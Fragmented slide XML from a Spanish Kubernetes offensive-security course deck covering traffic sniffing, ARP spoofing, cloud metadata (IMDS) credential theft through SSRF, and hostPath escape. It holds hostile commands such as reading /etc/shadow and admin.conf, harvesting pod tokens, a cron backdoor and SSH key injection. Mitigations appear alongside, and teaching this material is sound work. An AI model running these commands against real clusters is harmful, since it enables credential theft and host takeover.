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56" r:id="rId5"/>
    <p:sldId id="257" r:id="rId6"/>
    <p:sldId id="259" r:id="rId12"/>
    <p:sldId id="260" r:id="rId13"/>
    <p:sldId id="287" r:id="rId14"/>
    <p:sldId id="261" r:id="rId7"/>
    <p:sldId id="262" r:id="rId8"/>
    <p:sldId id="263" r:id="rId9"/>
    <p:sldId id="264" r:id="rId10"/>
    <p:sldId id="288" r:id="rId15"/>
    <p:sldId id="267" r:id="rId11"/>
    <p:sldId id="271" r:id="rId16"/>
    <p:sldId id="274" r:id="rId17"/>
    <p:sldId id="276" r:id="rId18"/>
    <p:sldId id="272" r:id="rId19"/>
    <p:sldId id="289" r:id="rId20"/>
    <p:sldId id="283" r:id="rId21"/>
    <p:sldId id="284" r:id="rId22"/>
    <p:sldId id="28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10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F2C96-6D44-41C8-ABA9-3321A267AC54}" type="datetimeFigureOut"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5D3F3-1EA7-4BDD-AA73-CCF5128D5189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6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3049D-B4BA-8B50-C04A-E44722A16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C85B0-417A-489F-59A1-E36688182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1C800-8B79-BBB1-DEEB-5C02FAB95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AD3EA-8935-666D-A9D9-C02919B953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5602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20.png"/><Relationship Id="rId7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9144000" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1212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Técnicas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Ataque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28575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SSRF &amp; Metadata  •  hostPath Abuse  •  Herramientas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Ofensiva en Kubernetes — Técnicas Reales de Pentesting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Unidad 5 — Técnicas Ofensivas en Kubernetes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1673352"/>
            <a:ext cx="7863840" cy="530352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0080" y="1673352"/>
            <a:ext cx="54864" cy="530352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6479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167335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Capabilities &amp; Sniffing de Tráfico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417320" y="19222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CAP_NET_RAW, interceptación HTTP en texto plano, ARP spoofing entre microservicios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589520" y="17190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40080" y="2295144"/>
            <a:ext cx="7863840" cy="530352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40080" y="2295144"/>
            <a:ext cx="54864" cy="5303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8658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2322576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SSRF &amp; Acceso a Cloud Metadata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17320" y="25694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Explotación de IMDS (169.254.169.254), robo de credenciales IAM desde Pods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7589520" y="234086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640080" y="2980944"/>
            <a:ext cx="7863840" cy="530352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40080" y="2980944"/>
            <a:ext cx="54864" cy="53035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72384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3008376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hostPath Abuse &amp; JWT Token Theft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1417320" y="32552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al host via volúmenes, robo de tokens JWT y pivoting entre namespaces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7589520" y="302666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640080" y="3602736"/>
            <a:ext cx="7863840" cy="530352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40080" y="3602736"/>
            <a:ext cx="54864" cy="5303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694176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417320" y="3630168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Ofensivas + 4 Labs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1417320" y="38770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kube-hunter, peirates, trivy + escenarios de ataque con explotación y remediación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7589520" y="364845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41" name="Text 3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Tráfico Interno: HTTP Plano = Peligro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Sin mTLS, un atacante en un Pod puede sniffear todo el tráfico del namespace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01168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 Sniffing de Tráfico Interno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3657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Desde un Pod comprometido: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1. Capturar tráfico con tcpdump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eth0 -A -s0 port 80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2. Filtrar credenciales HTTP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eth0 -A | grep -i \
  'password\|token\|auth\|cookie'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3. Capturar headers de Authorization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eth0 -A | grep -i \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'Authorization: Bearer'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201168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9204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BBF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🔍 Verificar Capabilities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657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Requisito: CAP_NET_RAW
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 capabilities del container
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cat /proc/1/status | grep Cap
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CapPrm: 00000000a80425fb
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Decodificar capabilities
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capsh --decode=00000000a80425fb
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→ cap_net_raw (bit 13) ✓
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→ Permite: tcpdump, raw sockets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→ Permite: ARP spoofing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264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Qué puede capturar un atacante con sniffing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1920240" cy="105156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192024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13048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" y="3794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 entre microservicios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4864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Credenciales, API keys, datos de usuario en texto plano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560320" y="3703320"/>
            <a:ext cx="1920240" cy="105156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560320" y="3703320"/>
            <a:ext cx="192024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81304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926080" y="3794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gRPC sin TLS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2651760" y="41148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Protobuf decodificable, tokens en metadata headers.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Protobuf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s-E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 una forma compacta y binaria de enviar datos entre servicios. (Codificados)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4663440" y="3703320"/>
            <a:ext cx="1920240" cy="105156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4663440" y="3703320"/>
            <a:ext cx="192024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13048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029200" y="3794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Redis/MongoDB sin auth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475488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Datos en texto plano, comandos de control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6766560" y="3703320"/>
            <a:ext cx="1920240" cy="105156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6766560" y="3703320"/>
            <a:ext cx="192024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813048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132320" y="3794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DNS queries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685800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Revelan qué servicios está consultando cada Pod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8437" y="202475"/>
            <a:ext cx="90199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Abuso de Capabilities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Linux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8437" y="692331"/>
            <a:ext cx="7752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Las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determinan qué acciones privilegiadas puede realizar un contenedor en el sistema.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39C12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7C2D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4216" y="1028700"/>
            <a:ext cx="4781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Linux divide los privilegios de ‘</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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’ en permisos pequeños llamados </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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 un contenedor recibe demasiadas, puede volverse peligroso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691640"/>
          <a:ext cx="8229600" cy="257860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Capability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Riesgo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Qué Permite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Herramientas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CAP_NET_RAW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750" kern="1200" dirty="0" err="1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Permite</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="750" kern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capturar</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="750" kern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 manipular </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="750" kern="1200" dirty="0" err="1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tráfico</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="750" kern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red.</a:t>
                      </a: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tcpdump, arpspoof, scapy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CAP_SYS_PTRACE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Trazar procesos: leer memoria de otros containers en el mismo Pod (shareProcessNamespace). Inyectar código.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strace, /proc/PID/mem, gdb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CAP_SYS_ADMIN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 a root casi completo. Mount filesystems, cgroups escape, namespace manipulation.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mount, nsenter, unshare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CAP_DAC_OVERRIDE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Bypass de permisos de archivos. Leer/escribir cualquier archivo ignorando permisos Unix.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 /etc/shadow (bypass)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39C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CAP_NET_ADMIN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750" kern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Permite cambiar la configuración de red del contenedor</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="750" kern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iptables, rutas, interfaces. Redirigir tráfico, crear túneles, MITM.</a:t>
                      </a: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iptables, ip route, tc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CAP_SETUID/GID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750" kern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Permite cambiar la identidad del proceso (usuario/grupo).</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="750" kern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UID/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="7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GID del proceso. Escalar a root dentro del container.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setuid binary, su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064E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46360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“Buenas prácticas: eliminar todas las </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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por defecto y agregar solo las estrictamente necesarias.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0B981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Defensa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capabilities: { drop: ["ALL"] } + agregar SOLO las necesarias (add: ["NET_BIND_SERVICE"])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F8538-9D9D-F449-422E-F4BDEFC9C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E9898E4-AD0D-2866-BD87-CB13F310CEA3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FC4E04-8872-0616-3FAB-E7CB0E5680BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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CAP_NET_RAW: Sniffing &amp; ARP Spoofing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684E59-1D67-FFAB-1D6E-1CE7B04A29E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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 capability más común y más peligrosa en containers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D358E55-9CA4-D8E1-D965-943D18A49D07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1051560"/>
            <a:ext cx="3931920" cy="2368296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9F79BF2-6F9D-121D-FC08-DE38C6823F9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="105156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2BDA082-3AC3-3D37-57F7-EFBF9FF7A2E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="59436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 ARP Spoofing Attack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558A885-56F2-6C0A-7BEA-565B4454053F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1371600"/>
            <a:ext cx="365760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ARP Spoofing desde un Pod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Requiere: CAP_NET_RAW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1. </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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Preparar el host para reenviar paquetes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echo 1 &gt; /proc/sys/net/ipv4/ip_forward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# 2. </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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Envenenar ARP (suplantación ARP) para “convencer” a la víctima de que el atacante es el </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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gateway</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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arpspoof -i eth0 -t &lt;victim-pod-ip&gt; \
  &lt;gateway-ip&gt;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. </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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Capturar tráfico que ahora atraviesa el atacante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eth0 -w capture.pcap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C0EC451-6AFB-086E-516E-92952D8E69E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1051560"/>
            <a:ext cx="3840480" cy="2386584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BE0BC01-A8EE-4196-F49F-E8E872DD08D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="105156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0FDE826-5C73-FB5F-233E-586CF5394433}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="489204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Mitigación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487EBF1-1CE3-1A7B-D702-518F9656EC5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="1371600"/>
            <a:ext cx="36118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✅ Pod sin CAP_NET_RAW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5B8DE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securityContext:
  capabilities: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drop: ["ALL"]       # ✅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Elimina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todas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las capabilities
    add: []             # ✅ No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agrega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privilegios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
# ✅ PSA restricted elimina NET_RAW
#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Bloquea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capabilities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peligrosas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10B981"/>
              </a:solidFill>
              <a:effectLst/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Automático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modo restricted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✅ Cilium CNI puede bloquear ARP
#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Antispoofing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kernel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326CE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✅ mTLS (Istio/Linkerd) cifra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326CE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Cifra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326CE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tráfico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326CE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326CE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interno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326CE5"/>
              </a:solidFill>
              <a:effectLst/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326CE5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#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326CE5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Mitiga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326CE5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 sniffing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326CE5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efectivo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E30C7BA-974B-7F38-3A5B-4CEF7805F760}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3456432"/>
            <a:ext cx="8229600" cy="320040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685AF15-2DB6-D71D-9AFB-20F7E221C3CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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Cadena: CAP_NET_RAW → ARP Spoof → MITM → Capturar credenciales HTTP → Movimiento Lateral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6A5D9C5-2E83-4749-D582-AD8CD5BEE95E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3794760"/>
            <a:ext cx="1920240" cy="96012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E169E4B-F00A-0BC6-A3E4-A091A3226076}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3794760"/>
            <a:ext cx="192024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6014E80-9C25-94CF-49DA-E7F2CBF50BDC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="38679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ARP Spoof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4FC9C29-7D31-1A6C-5AFC-A59D06A55027}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4073652"/>
            <a:ext cx="192024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Envenenar tabla ARP de la víctima para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redirigir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tráfico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atacante se hace pasar por otro equipo en la red. Redirige el tráfico hacia él para interceptarlo.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47AF5530-AD81-C23A-39D2-8179E65CB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4160520"/>
            <a:ext cx="137160" cy="137160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{646E6C7A-815B-F3D4-B642-9FB3EB6DD8C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2560320" y="3794760"/>
            <a:ext cx="1920240" cy="96012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7FA16EF-E1D4-9EF8-3B20-B4B10F2DE98F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2560320" y="3794760"/>
            <a:ext cx="192024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FEE9F58-8C5D-EE84-C8F3-7AFF05557CDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2651760" y="38679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MITM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5978853-E476-3ADE-FA64-977237E71128}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="265176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Todo el tráfico de la víctima pasa por el atacante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B1D25334-6E58-B844-25CB-B6B2B3037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4160520"/>
            <a:ext cx="137160" cy="137160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{730FD5F1-D1C9-D65E-0FDE-4B6FCC7F5514}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3794760"/>
            <a:ext cx="1920240" cy="96012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AAB41C1A-5159-3226-6B9E-8D70B3F44BFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3794760"/>
            <a:ext cx="192024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CEA88996-AD27-4247-4A7F-21B68C4CDD8F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="38679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Capturar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49B395B2-4E7F-0201-883F-8F0615232C3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488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tcpdump/tshark extrae credenciales, tokens, API keys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F3AA7441-B7E8-EA18-1EBB-E65B9B473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160520"/>
            <a:ext cx="137160" cy="137160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E030F3C7-B820-620C-99B6-F1DB11071016}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="3794760"/>
            <a:ext cx="1920240" cy="96012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BB90F392-6519-E128-A034-85EA5ADADC71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="3794760"/>
            <a:ext cx="1920240" cy="36576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4CC95C98-9E89-727E-A704-5C13B899E98A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="38679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6B6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Reutilizar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5AFCC76C-FBFB-3F6B-5357-9A23B46591E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800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Tokens capturados se usan para impersonar la víctima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7DCA1D94-8134-BB14-A094-DA4A47D11A65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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8560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Acceso a Cloud Metadata &amp; SSRF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endpoint 169.254.169.254 es la joya de la corona en la nube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7C2D1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241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instancia en AWS/GCP/Azure tiene un Instance Metadata Service (IMDS) en 169.254.169.254. Un Pod puede acceder a este endpoint y robar credenciales del nodo.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2651760" cy="246888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2651760" cy="457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20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(EC2 / EKS)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286000"/>
            <a:ext cx="2468880" cy="18288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40080" y="23317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http://169.254.169.254/latest/meta-data/
curl .../iam/security-credentials/&lt;role&gt;
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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AccessKeyId, SecretAccessKey, Token
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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IMDSv1: sin autenticación!
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3337560" y="1783080"/>
            <a:ext cx="2651760" cy="246888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337560" y="1783080"/>
            <a:ext cx="2651760" cy="4572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9202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40480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GCP (GCE / GKE)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429000" y="2286000"/>
            <a:ext cx="2468880" cy="18288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3520440" y="23317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-H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750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project-id, service-account tokens
→ access_token para GCP APIs
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6217920" y="1783080"/>
            <a:ext cx="2651760" cy="246888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217920" y="1783080"/>
            <a:ext cx="265176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20840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(VM / AKS)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309360" y="2286000"/>
            <a:ext cx="2468880" cy="18288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6400800" y="23317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-H 'Metadata: true' \
  http://169.254.169.254/metadata/
  instance?api-version=2021-02-01
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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subscriptionId, identity tokens
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1A0F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805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20140" y="4466191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(Server-Side Request Forgery): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-E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cuando una aplicación permite que un usuario controle la URL a la que el servidor realiza una petición HTTP</a:t>
            </a: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atacante puede redirigir la petición a 169.254.169.254 y exfiltrar credenciales del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800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</a:t>
            </a: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https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/                              ------- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800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Enumerar</a:t>
            </a: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Roles </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800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IAM (AWS)</a:t>
            </a:r>
          </a:p>
          <a:p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https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webserver-role  ------ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800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</a:t>
            </a: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</a:t>
            </a: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ROL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29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SSRF Attack Flow en Kubernetes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una vulnerabilidad web a credenciales de la nube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011680" cy="22860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011680" cy="45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6187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Vulnerabilidad SSRF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2011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aplicación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permite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controle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URL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servidor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consulta</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="80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/api/fetch?url=&lt;user_input&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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201168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60320" y="1097280"/>
            <a:ext cx="2011680" cy="22860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560320" y="1097280"/>
            <a:ext cx="2011680" cy="45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651760" y="123444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6517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126187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6517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Redirect a IMDS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2651760" y="2011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atacante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redirige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petición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 IMDS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="80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pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="80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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>http://169.254.169.254/latest/meta-data/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/...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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01168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800600" y="1097280"/>
            <a:ext cx="2011680" cy="22860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800600" y="1097280"/>
            <a:ext cx="201168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4892040" y="1234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8920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126187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920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Credenciales Expuestas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892040" y="2011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IMDS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devuelve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credenciales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temporales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 IAM ROLE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="80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AccessKeyId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SecretAccessKey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SessionToken</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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011680"/>
            <a:ext cx="182880" cy="18288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040880" y="1097280"/>
            <a:ext cx="2011680" cy="22860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7040880" y="1097280"/>
            <a:ext cx="2011680" cy="457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7132320" y="123444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71323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1261872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323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Acceso a Cloud APIs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7132320" y="2011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atacante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las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credenciales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 acceder a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servicios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 la </a:t>
            </a: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nube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</a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="80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pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="80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</a:t>
            </a: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s3 ls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describe-instances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CONTROL TOTAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3611880"/>
            <a:ext cx="8229600" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1A0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Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3611880"/>
            <a:ext cx="54864" cy="12801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703320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05156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Mitigación SSRF &amp; Metadata</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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114800"/>
            <a:ext cx="182880" cy="18288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1440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IMDSv2 (AWS)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822960" y="4319733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token de session para acceder al IMDS – Reduce </a:t>
            </a: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SSRF Simples</a:t>
            </a:r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7480" y="4114800"/>
            <a:ext cx="182880" cy="18288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292608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NetworkPolicy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2779776" y="43251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169.254.169.254 desde Pods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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4114800"/>
            <a:ext cx="182880" cy="18288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493776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Validación de URLs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760" y="43251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</a:t>
            </a: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confiables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Ips </a:t>
            </a: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internas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5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4114800"/>
            <a:ext cx="182880" cy="182880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694944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 Identity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6812280" y="43251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usar las del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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50" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 3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Abuso del hostPath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volumen te da las llaves del reino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7C2D1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2412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</a:t>
            </a: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</a:t>
            </a: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</a:t>
            </a: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directorios</a:t>
            </a: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05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</a:t>
            </a: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 Pod. SI un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="105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</a:t>
            </a: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compromete</a:t>
            </a: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Pod, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="105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acceder o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="105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</a:t>
            </a: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host.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3931920" cy="192024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709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YAML Vulnerable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2011680"/>
            <a:ext cx="3657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 VULNERABLE: hostPath monta /
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="85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
</a:t>
            </a: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host-root
    hostPath:
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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              # ⚠ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0" err="1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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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al Host!
</a:t>
            </a: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type: Directory
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="85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volumeMounts:
</a:t>
            </a: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host-root
    mountPath: /host
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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readOnly: false        # ⚠ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0" err="1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Permite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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Escritura</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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54880" y="1691640"/>
            <a:ext cx="3931920" cy="192024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69164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92040" y="1709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Vectores de Explotación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92040" y="1984248"/>
            <a:ext cx="3657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Qué puede hacer el atacante:
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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Leer credenciales del host
</a:t>
            </a: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/host/etc/shadow
cat /host/etc/kubernetes/admin.conf
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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Leer tokens de otros Pods
</a:t>
            </a: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/host/var/lib/kubelet/pods/ \
  -name 'token' -exec cat {} \;
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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Escribir crontab para persistencia
</a:t>
            </a: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'* * * * * /tmp/backdoor' \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 /host/var/spool/cron/root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3813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Niveles de Riesgo por Ruta hostPath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4206240"/>
            <a:ext cx="1920240" cy="73152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4206240"/>
            <a:ext cx="192024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4270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554480" y="42702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CRÍTICO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4864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 al host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560320" y="4206240"/>
            <a:ext cx="1920240" cy="73152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560320" y="4206240"/>
            <a:ext cx="192024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651760" y="4270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2702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ALTO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65176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Credenciales, configs del nodo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663440" y="4206240"/>
            <a:ext cx="1920240" cy="73152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663440" y="4206240"/>
            <a:ext cx="192024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54880" y="4270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760720" y="42702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MEDIO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75488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con info sensible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766560" y="4206240"/>
            <a:ext cx="1920240" cy="73152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766560" y="4206240"/>
            <a:ext cx="192024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858000" y="4270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/var/run/docker.sock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863840" y="42702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CRÍTICO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8580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container runtime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Escape via hostPath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Pod comprometido al control total del nodo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600200" cy="18288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600200" cy="3657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18872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Acceso al Pod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atacante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obtiene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ejecución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dentro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 un Pod</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="75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RCE o kubectl exec en Pod con hostPath: /</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7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1828800"/>
            <a:ext cx="164592" cy="1645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57400" y="1051560"/>
            <a:ext cx="1600200" cy="18288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057400" y="1051560"/>
            <a:ext cx="160020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51760" y="118872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6517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14884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Leer /etc/shadow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148840" y="2057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atacante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accede al filesystem del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desde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contenedor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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75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/host/etc/shadow → hashes de usuarios del host</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7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828800"/>
            <a:ext cx="164592" cy="16459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840480" y="1051560"/>
            <a:ext cx="1600200" cy="18288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840480" y="1051560"/>
            <a:ext cx="160020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434840" y="118872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4348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93192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Escribir SSH Key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931920" y="2057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atacante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clave SSH al Usuario root del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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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75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'ssh-rsa ...' &gt;&gt; /host/root/.ssh/authorized_keys</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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828800"/>
